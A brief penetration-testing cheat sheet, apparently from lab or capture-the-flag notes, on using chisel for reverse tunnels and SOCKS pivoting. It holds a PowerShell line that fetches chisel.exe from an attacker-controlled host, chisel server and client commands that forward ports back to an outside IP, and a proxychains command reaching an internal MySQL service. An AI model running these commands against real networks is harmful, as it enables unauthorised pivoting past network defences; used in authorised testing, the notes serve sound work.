https://github.com/jpillora/chisel/releases

```powershell
Invoke-WebRequest -Uri http://<ip>:8000/chisel.exe -OutFile chisel.exe
```

```bash
# Server
chisel server --reverse --socks5
# Server on Custom Port
chisel server --reverse --port 9001
# Client
chisel client 10.10.16.48:8080 R:8200:localhost:8200

chisel client 10.10.16.48:9001 R:8200:localhost:8200
```
## Proxychains
```bash
chisel server --reverse --socks5 --port 9999

chisel client <ip>:9999 R:socks

proxychains mysql -u username -p password -h 127.0.0.1:1080
```

## Port Forwarding
https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/